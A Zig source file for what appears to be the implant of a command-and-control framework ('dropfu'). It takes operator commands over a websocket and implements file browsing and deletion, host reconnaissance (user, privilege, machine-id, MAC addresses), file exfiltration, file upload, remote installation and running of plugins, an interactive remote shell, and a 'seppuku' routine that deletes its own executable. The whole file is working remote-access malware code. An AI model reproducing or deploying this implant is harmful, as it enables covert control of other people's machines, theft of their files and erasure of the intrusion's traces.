const std = @import("std");
const builtin = @import("builtin");
const Allocator = std.mem.Allocator;
const protocol = @import("dropfu_protocol");
const websocket = @import("websocket.zig");
const plugin_runtime = @import("plugin_runtime.zig");

pub const Action = enum { shell, seppuku };
pub const Result = union(enum) {
    output: []const u8,
    action: Action,
};

pub fn dispatch(
    allocator: Allocator,
    io: std.Io,
    environ: std.process.Environ,
    cmd: []const u8,
    args: []const []const u8,
) !Result {
    if (eql(cmd, "pwd")) return .{ .output = try cmdPwd(allocator, io) };
    if (eql(cmd, "ls")) return .{ .output = try cmdLs(allocator, io, args) };
    if (eql(cmd, "cat")) return .{ .output = try cmdCat(allocator, io, args) };
    if (eql(cmd, "find")) return .{ .output = try cmdFind(allocator, io, args) };
    if (eql(cmd, "cp")) return .{ .output = try cmdCp(allocator, io, args) };
    if (eql(cmd, "mv")) return .{ .output = try cmdMv(allocator, io, args) };
    if (eql(cmd, "rm")) return .{ .output = try cmdRm(allocator, io, args) };
    if (eql(cmd, "systeminfo")) return .{ .output = try cmdSystemInfo(allocator, io, environ) };
    if (eql(cmd, "plugin")) return .{ .output = try cmdPlugin(allocator, io, environ, args) };
    if (eql(cmd, "shell")) return .{ .action = .shell };
    if (eql(cmd, "seppuku")) return .{ .action = .seppuku };
    return .{ .output = try std.fmt.allocPrint(allocator, "error: unknown command '{s}'", .{cmd}) };
}

fn cmdPwd(allocator: Allocator, io: std.Io) ![]const u8 {
    // realPathFileAlloc returns a sentinel slice. Coercing that to []const u8
    // drops the extra byte, and SafeAllocator then rejects the free.
    var buf: [std.Io.Dir.max_path_bytes]u8 = undefined;
    const n = try std.Io.Dir.cwd().realPathFile(io, ".", &buf);
    return allocator.dupe(u8, buf[0..n]);
}

fn cmdLs(allocator: Allocator, io: std.Io, args: []const []const u8) ![]const u8 {
    const path = if (args.len > 0) args[0] else ".";
    var dir = std.Io.Dir.cwd().openDir(io, path, .{ .iterate = true }) catch |e|
        return std.fmt.allocPrint(allocator, "error: cannot open '{s}': {}", .{ path, e });
    defer dir.close(io);

    var out: std.Io.Writer.Allocating = .init(allocator);
    errdefer out.deinit();
    var it = dir.iterate();
    while (try it.next(io)) |entry| {
        const kind: u8 = switch (entry.kind) {
            .directory => 'd',
            .sym_link => 'l',
            .file => '-',
            else => '?',
        };
        try out.writer.print("{c}  {s}\n", .{ kind, entry.name });
    }
    if (out.writer.buffered().len == 0) try out.writer.writeAll("(empty directory)\n");
    return try out.toOwnedSlice();
}

fn cmdCat(allocator: Allocator, io: std.Io, args: []const []const u8) ![]const u8 {
    if (args.len == 0) return allocator.dupe(u8, "usage: cat <file_path>");
    const file = std.Io.Dir.cwd().openFile(io, args[0], .{}) catch |e|
        return std.fmt.allocPrint(allocator, "error: cannot open '{s}': {}", .{ args[0], e });
    defer file.close(io);
    var buf: [1024]u8 = undefined;
    const n = file.readPositionalAll(io, &buf, 0) catch |e|
        return std.fmt.allocPrint(allocator, "error: read failed: {}", .{e});
    return allocator.dupe(u8, buf[0..n]);
}

fn cmdFind(allocator: Allocator, io: std.Io, args: []const []const u8) ![]const u8 {
    if (args.len < 2) return allocator.dupe(u8, "usage: find <folder_path> <pattern>");
    const root = args[0];
    const pattern = args[1];

    var dir = std.Io.Dir.cwd().openDir(io, root, .{ .iterate = true }) catch |e|
        return std.fmt.allocPrint(allocator, "error: cannot open '{s}': {}", .{ root, e });
    defer dir.close(io);

    var out: std.Io.Writer.Allocating = .init(allocator);
    errdefer out.deinit();

    var walker = dir.walk(allocator) catch |e|
        return std.fmt.allocPrint(allocator, "error: walk failed: {}", .{e});
    defer walker.deinit();

    var count: usize = 0;
    while (walker.next(io) catch null) |entry| {
        if (globMatchInsensitive(pattern, entry.basename)) {
            try out.writer.print("{s}/{s}\n", .{ root, entry.path });
            count += 1;
            if (count >= 500) {
                try out.writer.writeAll("... (truncated at 500 results)\n");
                break;
            }
        }
    }
    if (count == 0) try out.writer.writeAll("(no matches)\n");
    return try out.toOwnedSlice();
}

fn cmdCp(allocator: Allocator, io: std.Io, args: []const []const u8) ![]const u8 {
    if (args.len < 2) return allocator.dupe(u8, "usage: cp <source> <dest>");
    const src = args[0];
    const dst = args[1];

    const st = std.Io.Dir.cwd().statFile(io, src, .{}) catch |e|
        return allocator.print("error: cannot stat '{s}': {}", .{ src, e });
    if (st.kind == .directory) {
        // Recursive directory copy via walk.
        std.Io.Dir.cwd().createDirPath(io, dst) catch |e|
            return allocator.print("error: cannot create '{s}': {}", .{ dst, e });
        var src_dir = std.Io.Dir.cwd().openDir(io, src, .{ .iterate = true }) catch |e|
            return allocator.print("error: cannot open '{s}': {}", .{ src, e });
        defer src_dir.close(io);
        var walker = src_dir.walk(allocator) catch |e|
            return allocator.print("error: walk failed: {}", .{e});
        defer walker.deinit();
        var count: usize = 0;
        while (walker.next(io) catch null) |entry| {
            var sp: [std.Io.Dir.max_path_bytes]u8 = undefined;
            var dp: [std.Io.Dir.max_path_bytes]u8 = undefined;
            const src_path = std.fmt.bufPrint(&sp, "{s}/{s}", .{ src, entry.path }) catch continue;
            const dst_path = std.fmt.bufPrint(&dp, "{s}/{s}", .{ dst, entry.path }) catch continue;
            switch (entry.kind) {
                .directory => std.Io.Dir.cwd().createDirPath(io, dst_path) catch {},
                .file => std.Io.Dir.cwd().copyFile(src_path, std.Io.Dir.cwd(), dst_path, io, .{}) catch {},
                else => {},
            }
            count += 1;
            if (count >= 10000) break;
        }
        return allocator.print("copied directory '{s}' -> '{s}' ({d} entries)", .{ src, dst, count });
    }

    std.Io.Dir.cwd().copyFile(src, std.Io.Dir.cwd(), dst, io, .{}) catch |e|
        return allocator.print("error: copy failed: {}", .{e});
    return allocator.print("copied '{s}' -> '{s}'", .{ src, dst });
}

fn cmdMv(allocator: Allocator, io: std.Io, args: []const []const u8) ![]const u8 {
    if (args.len < 2) return allocator.dupe(u8, "usage: mv <source> <dest>");
    const src = args[0];
    const dst = args[1];

    std.Io.Dir.cwd().rename(src, std.Io.Dir.cwd(), dst, io) catch |e|
        return std.fmt.allocPrint(allocator, "error: move failed: {}", .{e});
    return std.fmt.allocPrint(allocator, "moved '{s}' -> '{s}'", .{ src, dst });
}

fn cmdRm(allocator: Allocator, io: std.Io, args: []const []const u8) ![]const u8 {
    if (args.len == 0) return allocator.dupe(u8, "usage: rm <file_path>");
    const path = args[0];
    std.Io.Dir.cwd().deleteFile(io, path) catch |e|
        return std.fmt.allocPrint(allocator, "error: cannot remove '{s}': {}", .{ path, e });
    return std.fmt.allocPrint(allocator, "removed '{s}'", .{path});
}

fn cmdSystemInfo(allocator: Allocator, io: std.Io, environ: std.process.Environ) ![]const u8 {
    var out: std.Io.Writer.Allocating = .init(allocator);
    errdefer out.deinit();
    const w = &out.writer;

    try w.print("hostname  : {s}\n", .{hostname(io)});
    try printEnv(allocator, environ, w, "user      ", "USER", "unknown");
    try w.print("os        : {s}\n", .{@tagName(builtin.os.tag)});
    appendFileFieldInline(io, w, "os version", "/etc/os-release", "PRETTY_NAME=");
    try w.print("arch      : {s}\n", .{@tagName(builtin.cpu.arch)});
    try w.print("privilege : {s}\n", .{privilegeLevel()});
    try printEnv(allocator, environ, w, "language  ", "LANG", "unknown");

    if (builtin.os.tag == .linux) {
        appendCpuInfo(io, w);
        appendMemInfo(io, w);
        appendFileField(io, w, "machine-id", "/etc/machine-id");
    }

    appendNetworkInfo(io, w);

    return try out.toOwnedSlice();
}

fn cmdPlugin(allocator: Allocator, io: std.Io, environ: std.process.Environ, args: []const []const u8) ![]const u8 {
    if (args.len == 0) return allocator.dupe(
        u8,
        "usage: plugin <subcommand>\n\n" ++
            "  plugin list                 List available plugins\n" ++
            "  plugin install <name>       Download and install a plugin\n" ++
            "  plugin uninstall <name>     Remove an installed plugin\n" ++
            "  plugin run <name> [args]    Run an installed plugin",
    );

    if (eql(args[0], "list")) {
        return plugin_runtime.listPackages(allocator, io, environ);
    }

    if (eql(args[0], "install")) {
        if (args.len < 2) return allocator.dupe(u8, "usage: plugin install <name>");
        return plugin_runtime.install(allocator, io, environ, args[1]);
    }

    if (eql(args[0], "uninstall")) {
        if (args.len < 2) return allocator.dupe(u8, "usage: plugin uninstall <name>");
        return plugin_runtime.uninstall(allocator, io, args[1]);
    }

    if (eql(args[0], "run")) {
        if (args.len < 2) return allocator.dupe(u8, "usage: plugin run <name> [args...]");
        return plugin_runtime.execute(allocator, io, args[1], if (args.len > 2) args[2..] else &.{});
    }

    return std.fmt.allocPrint(allocator, "error: unknown subcommand '{s}'. Run 'plugin' for usage.", .{args[0]});
}

pub fn handleDownload(
    allocator: Allocator,
    stream: websocket.Conn,
    write_mutex: *std.Io.Mutex,
    agent_id: []const u8,
    msg_id: []const u8,
    path: []const u8,
) !void {
    const io = stream.io;
    const file = try std.Io.Dir.cwd().openFile(io, path, .{});
    defer file.close(io);
    const stat = try file.stat(io);
    const basename = std.fs.path.basename(path);

    const meta = try protocol.serialize(allocator, protocol.FileMetaMsg{
        .id = msg_id,
        .agent_id = agent_id,
        .timestamp = protocol.timestamp(io),
        .payload = .{ .direction = "download", .filename = basename, .size = stat.size },
    });
    defer allocator.free(meta);
    {
        write_mutex.lockUncancelable(io);
        defer write_mutex.unlock(io);
        try websocket.sendText(stream, meta);
    }

    var offset: u64 = 0;
    var read_buf: [protocol.MAX_FILE_CHUNK_RAW]u8 = undefined;
    var hasher = std.crypto.hash.sha2.Sha256.init(.{});

    if (stat.size == 0) {
        const chunk = try protocol.serialize(allocator, protocol.FileChunkMsg{
            .id = msg_id,
            .agent_id = agent_id,
            .timestamp = protocol.timestamp(io),
            .payload = .{ .offset = 0, .data = "", .final = true },
        });
        defer allocator.free(chunk);
        write_mutex.lockUncancelable(io);
        defer write_mutex.unlock(io);
        try websocket.sendText(stream, chunk);
        return;
    }

    while (offset < stat.size) {
        var iov: [1][]u8 = .{&read_buf};
        const n = try file.readPositional(io, &iov, offset);
        if (n == 0) break;
        hasher.update(read_buf[0..n]);
        const b64 = try b64Encode(allocator, read_buf[0..n]);
        defer allocator.free(b64);
        const next = offset + n;
        const is_final = next >= stat.size;
        const chunk = try protocol.serialize(allocator, protocol.FileChunkMsg{
            .id = msg_id,
            .agent_id = agent_id,
            .timestamp = protocol.timestamp(io),
            .payload = .{ .offset = offset, .data = b64, .final = is_final },
        });
        defer allocator.free(chunk);
        {
            write_mutex.lockUncancelable(io);
            defer write_mutex.unlock(io);
            try websocket.sendText(stream, chunk);
        }
        offset = next;
        if (is_final) break;
    }
}

pub fn handleUpload(
    allocator: Allocator,
    io: std.Io,
    dest_path: []const u8,
    payload: std.json.ObjectMap,
) !void {
    const b64_data = protocol.getStr(payload, "data") orelse return error.MissingData;
    const is_final = blk: {
        const v = payload.get("final") orelse break :blk false;
        break :blk switch (v) {
            .bool => |b| b,
            else => false,
        };
    };
    _ = is_final;

    const decoded_size = std.base64.standard.Decoder.calcSizeForSlice(b64_data) catch return error.InvalidBase64;
    const decoded = try allocator.alloc(u8, decoded_size);
    defer allocator.free(decoded);
    std.base64.standard.Decoder.decode(decoded, b64_data) catch return error.InvalidBase64;

    const file = try std.Io.Dir.cwd().createFile(io, dest_path, .{ .truncate = false });
    defer file.close(io);
    const off: u64 = if (protocol.getInt(payload, "offset")) |o| @intCast(o) else 0;
    try file.writePositionalAll(io, decoded, off);
}

pub const ShellSession = struct {
    child: std.process.Child,
    stdout_thread: std.Thread,
    stderr_thread: std.Thread,
    stdin_file: std.Io.File,
    io: std.Io,
    sid_owned: []const u8,
    allocator: Allocator,

    pub fn writeInput(self: *ShellSession, data: []const u8) void {
        self.stdin_file.writeStreamingAll(self.io, data) catch {};
    }

    pub fn close(self: *ShellSession) void {
        self.stdin_file.close(self.io);
        self.stdout_thread.join();
        self.stderr_thread.join();
        _ = self.child.wait(self.io) catch {};
        self.allocator.free(self.sid_owned);
    }
};

pub fn startShell(
    allocator: Allocator,
    stream: websocket.Conn,
    write_mutex: *std.Io.Mutex,
    agent_id: []const u8,
    session_id: []const u8,
) ?ShellSession {
    const io = stream.io;
    const shell_path: []const u8 = switch (builtin.os.tag) {
        .windows => "cmd.exe",
        else => "/bin/sh",
    };

    const sid_owned = allocator.dupe(u8, session_id) catch return null;

    var child = std.process.spawn(io, .{
        .argv = &.{shell_path},
        .stdin = .pipe,
        .stdout = .pipe,
        .stderr = .pipe,
    }) catch {
        allocator.free(sid_owned);
        return null;
    };

    const stdin_file = child.stdin orelse {
        child.kill(io);
        allocator.free(sid_owned);
        return null;
    };
    const stdout_file = child.stdout orelse {
        child.kill(io);
        allocator.free(sid_owned);
        return null;
    };
    const stderr_file = child.stderr orelse {
        child.kill(io);
        allocator.free(sid_owned);
        return null;
    };

    const ReaderCtx = struct {
        a: Allocator,
        s: websocket.Conn,
        wm: *std.Io.Mutex,
        aid: []const u8,
        sid: []const u8,
    };
    const ctx = ReaderCtx{
        .a = allocator,
        .s = stream,
        .wm = write_mutex,
        .aid = agent_id,
        .sid = sid_owned,
    };

    const pipeReader = struct {
        fn run(c: ReaderCtx, fd: std.Io.File, send_eof: bool) void {
            var buf: [4096]u8 = undefined;
            while (true) {
                var iov: [1][]u8 = .{&buf};
                const n = fd.readStreaming(c.s.io, &iov) catch break;
                if (n == 0) break;
                const msg = protocol.serialize(c.a, protocol.ShellDataMsg{
                    .id = c.sid,
                    .agent_id = c.aid,
                    .timestamp = protocol.timestamp(c.s.io),
                    .payload = .{ .data = buf[0..n] },
                }) catch continue;
                defer c.a.free(msg);
                c.wm.lockUncancelable(c.s.io);
                defer c.wm.unlock(c.s.io);
                websocket.sendText(c.s, msg) catch {};
            }
            if (send_eof) {
                const eof_msg = protocol.serialize(c.a, protocol.ShellDataMsg{
                    .id = c.sid,
                    .agent_id = c.aid,
                    .timestamp = protocol.timestamp(c.s.io),
                    .payload = .{ .data = "", .eof = true },
                }) catch return;
                defer c.a.free(eof_msg);
                c.wm.lockUncancelable(c.s.io);
                defer c.wm.unlock(c.s.io);
                websocket.sendText(c.s, eof_msg) catch {};
            }
        }
    }.run;

    const t1 = std.Thread.spawn(.{}, pipeReader, .{ ctx, stdout_file, true }) catch {
        child.kill(io);
        allocator.free(sid_owned);
        return null;
    };
    const t2 = std.Thread.spawn(.{}, pipeReader, .{ ctx, stderr_file, false }) catch {
        child.kill(io);
        t1.join();
        allocator.free(sid_owned);
        return null;
    };

    // `wait` closes any stdio handles still attached to the child. The session
    // closes stdin itself so the shell sees EOF before those threads are joined.
    child.stdin = null;

    return ShellSession{
        .child = child,
        .stdout_thread = t1,
        .stderr_thread = t2,
        .stdin_file = stdin_file,
        .io = io,
        .sid_owned = sid_owned,
        .allocator = allocator,
    };
}

pub fn doSeppuku(io: std.Io, allocator: Allocator) void {
    std.Io.Dir.cwd().deleteTree(io, "plugins") catch {};
    if (std.process.executablePathAlloc(io, allocator)) |path| {
        defer allocator.free(path);
        std.Io.Dir.deleteFileAbsolute(io, path) catch {};
    } else |_| {}
    std.process.exit(0);
}

fn eql(a: []const u8, b: []const u8) bool {
    return std.mem.eql(u8, a, b);
}

fn hostname(io: std.Io) []const u8 {
    const Static = struct {
        var buf: [256]u8 = undefined;
        var len: usize = 0;
    };
    if (Static.len > 0) return Static.buf[0..Static.len];
    if (builtin.os.tag == .linux or builtin.os.tag == .macos) {
        const f = std.Io.Dir.openFileAbsolute(io, "/etc/hostname", .{}) catch return "unknown";
        defer f.close(io);
        Static.len = f.readPositionalAll(io, &Static.buf, 0) catch return "unknown";
        const h = std.mem.trim(u8, Static.buf[0..Static.len], &std.ascii.whitespace);
        Static.len = h.len;
        std.mem.copyForwards(u8, Static.buf[0..h.len], h);
        return Static.buf[0..Static.len];
    }
    return "unknown";
}

fn privilegeLevel() []const u8 {
    if (builtin.os.tag == .windows) return "user";
    if (builtin.os.tag == .linux) {
        return if (std.os.linux.geteuid() == 0) "root" else "user";
    }
    if (builtin.os.tag == .macos) {
        return if (std.c.geteuid() == 0) "root" else "user";
    }
    return "user";
}

test "globMatchInsensitive" {
    try std.testing.expect(globMatchInsensitive("*.txt", "foo.txt"));
    try std.testing.expect(globMatchInsensitive("FOO*", "foobar"));
    try std.testing.expect(!globMatchInsensitive("*.txt", "foo.bin"));
}

fn printEnv(
    allocator: Allocator,
    environ: std.process.Environ,
    w: *std.Io.Writer,
    label: []const u8,
    key: []const u8,
    default: []const u8,
) !void {
    const val = std.process.Environ.getAlloc(environ, allocator, key) catch {
        try w.print("{s}: {s}\n", .{ label, default });
        return;
    };
    defer allocator.free(val);
    try w.print("{s}: {s}\n", .{ label, val });
}

fn appendFileField(io: std.Io, w: *std.Io.Writer, label: []const u8, path: []const u8) void {
    const f = std.Io.Dir.openFileAbsolute(io, path, .{}) catch return;
    defer f.close(io);
    var buf: [256]u8 = undefined;
    const n = f.readPositionalAll(io, &buf, 0) catch return;
    w.print("{s}: {s}\n", .{ label, std.mem.trim(u8, buf[0..n], &std.ascii.whitespace) }) catch {};
}

fn appendFileFieldInline(io: std.Io, w: *std.Io.Writer, label: []const u8, path: []const u8, prefix: []const u8) void {
    const f = std.Io.Dir.openFileAbsolute(io, path, .{}) catch return;
    defer f.close(io);
    var buf: [4096]u8 = undefined;
    const n = f.readPositionalAll(io, &buf, 0) catch return;
    const content = buf[0..n];
    var line_it = std.mem.splitScalar(u8, content, '\n');
    while (line_it.next()) |line| {
        if (std.mem.startsWith(u8, line, prefix)) {
            var val = line[prefix.len..];
            if (val.len >= 2 and val[0] == '"' and val[val.len - 1] == '"')
                val = val[1 .. val.len - 1];
            w.print("{s: <10}: {s}\n", .{ label, val }) catch {};
            return;
        }
    }
}

fn appendCpuInfo(io: std.Io, w: *std.Io.Writer) void {
    if (builtin.os.tag != .linux) return;
    const f = std.Io.Dir.openFileAbsolute(io, "/proc/cpuinfo", .{}) catch return;
    defer f.close(io);
    var buf: [8192]u8 = undefined;
    const n = f.readPositionalAll(io, &buf, 0) catch return;
    const content = buf[0..n];

    var model: []const u8 = "unknown";
    var cores: u32 = 0;

    var line_it = std.mem.splitScalar(u8, content, '\n');
    while (line_it.next()) |line| {
        if (std.mem.startsWith(u8, line, "model name")) {
            if (std.mem.find(u8, line, ": ")) |idx| {
                model = std.mem.trim(u8, line[idx + 2 ..], &std.ascii.whitespace);
            }
        }
        if (std.mem.startsWith(u8, line, "processor")) cores += 1;
    }
    w.print("cpu       : {s} ({d} cores)\n", .{ model, cores }) catch {};
}

fn appendMemInfo(io: std.Io, w: *std.Io.Writer) void {
    if (builtin.os.tag != .linux) return;
    const f = std.Io.Dir.openFileAbsolute(io, "/proc/meminfo", .{}) catch return;
    defer f.close(io);
    var buf: [4096]u8 = undefined;
    const n = f.readPositionalAll(io, &buf, 0) catch return;
    const content = buf[0..n];

    var total_kb: u64 = 0;
    var avail_kb: u64 = 0;

    var line_it = std.mem.splitScalar(u8, content, '\n');
    while (line_it.next()) |line| {
        if (std.mem.startsWith(u8, line, "MemTotal:")) {
            total_kb = parseMemValue(line);
        } else if (std.mem.startsWith(u8, line, "MemAvailable:")) {
            avail_kb = parseMemValue(line);
        }
    }

    if (total_kb > 0) {
        const total_mb = total_kb / 1024;
        const avail_mb = avail_kb / 1024;
        const used_mb = total_mb - avail_mb;
        w.print("memory    : {d} MB used / {d} MB total ({d} MB available)\n", .{ used_mb, total_mb, avail_mb }) catch {};
    }
}

fn parseMemValue(line: []const u8) u64 {
    const colon = std.mem.find(u8, line, ":") orelse return 0;
    const trimmed = std.mem.trim(u8, line[colon + 1 ..], &std.ascii.whitespace);
    const space = std.mem.find(u8, trimmed, " ") orelse trimmed.len;
    return std.fmt.parseInt(u64, trimmed[0..space], 10) catch 0;
}

fn appendNetworkInfo(io: std.Io, w: *std.Io.Writer) void {
    if (builtin.os.tag != .linux) return;
    var dir = std.Io.Dir.openDirAbsolute(io, "/sys/class/net", .{ .iterate = true }) catch return;
    defer dir.close(io);
    var it = dir.iterate();
    while (it.next(io) catch null) |entry| {
        if (eql(entry.name, "lo")) continue;
        var abuf: [256]u8 = undefined;
        const apath = std.fmt.bufPrint(&abuf, "/sys/class/net/{s}/address", .{entry.name}) catch continue;
        const f = std.Io.Dir.openFileAbsolute(io, apath, .{}) catch continue;
        defer f.close(io);
        var mbuf: [64]u8 = undefined;
        const n = f.readPositionalAll(io, &mbuf, 0) catch continue;
        w.print("iface     : {s}  mac={s}\n", .{
            entry.name,
            std.mem.trim(u8, mbuf[0..n], &std.ascii.whitespace),
        }) catch {};
    }
}

fn b64Encode(allocator: Allocator, data: []const u8) ![]const u8 {
    const size = std.base64.standard.Encoder.calcSize(data.len);
    const buf = try allocator.alloc(u8, size);
    _ = std.base64.standard.Encoder.encode(buf, data);
    return buf;
}

pub fn globMatchInsensitive(pattern: []const u8, name: []const u8) bool {
    var pi: usize = 0;
    var ni: usize = 0;
    var star_p: usize = pattern.len;
    var star_n: usize = 0;

    while (ni < name.len) {
        if (pi < pattern.len and (pattern[pi] == '?' or toLower(pattern[pi]) == toLower(name[ni]))) {
            pi += 1;
            ni += 1;
        } else if (pi < pattern.len and pattern[pi] == '*') {
            star_p = pi;
            star_n = ni;
            pi += 1;
        } else if (star_p < pattern.len) {
            pi = star_p + 1;
            star_n += 1;
            ni = star_n;
        } else {
            return false;
        }
    }
    while (pi < pattern.len and pattern[pi] == '*') pi += 1;
    return pi == pattern.len;
}

fn toLower(c: u8) u8 {
    return if (c >= 'A' and c <= 'Z') c + 32 else c;
}
